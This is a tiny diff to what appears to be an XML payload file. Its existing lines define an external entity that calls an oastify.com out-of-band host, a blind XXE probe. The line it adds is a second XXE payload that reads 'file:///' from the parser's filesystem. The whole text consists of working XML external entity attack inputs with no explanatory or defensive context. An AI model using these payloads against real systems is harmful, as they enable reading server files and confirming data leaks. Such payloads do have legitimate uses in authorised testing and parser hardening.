@@ -1,3 +1,4 @@
 
 <!DOCTYPE x [ <!ENTITY test SYSTEM "http://ezhu6yj9r42ejtmrlesegvnpcgi76xum.oastify.com"> ]>
 <x>&test;</x>
+<!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>
